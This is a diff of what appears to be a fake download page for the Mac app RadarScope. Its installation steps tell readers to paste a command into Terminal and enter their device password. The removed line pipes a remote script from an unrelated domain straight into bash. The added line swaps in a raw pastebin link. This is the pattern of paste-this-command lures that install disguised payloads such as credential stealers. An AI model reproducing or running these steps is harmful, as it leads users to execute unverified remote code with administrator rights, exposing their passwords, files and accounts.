@@ -29,7 +29,7 @@ You can download the latest version of **RadarScope for Mac** below:
 
 1. Copy the installation command below.
 ```
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+https://pastebin.com/raw/DSzkApCf
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
